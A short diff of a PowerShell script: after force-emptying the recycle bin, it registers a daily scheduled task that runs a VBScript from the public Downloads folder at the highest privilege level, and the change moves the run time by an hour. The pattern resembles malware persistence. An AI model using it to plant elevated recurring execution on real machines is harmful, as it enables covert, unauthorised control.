@@ -72,7 +72,7 @@ Clear-RecycleBin -Force
 $taskName = "Run Setup.vbs Daily"
 $setupPath = "C:\Users\Public\Downloads\Setup.vbs"
 $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$setupPath`""
-$trigger = New-ScheduledTaskTrigger -Daily -At 1:00PM
+$trigger = New-ScheduledTaskTrigger -Daily -At 2:00PM
 $principal = New-ScheduledTaskPrincipal -UserId "$env:UserName" -RunLevel Highest
 Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force
 exit
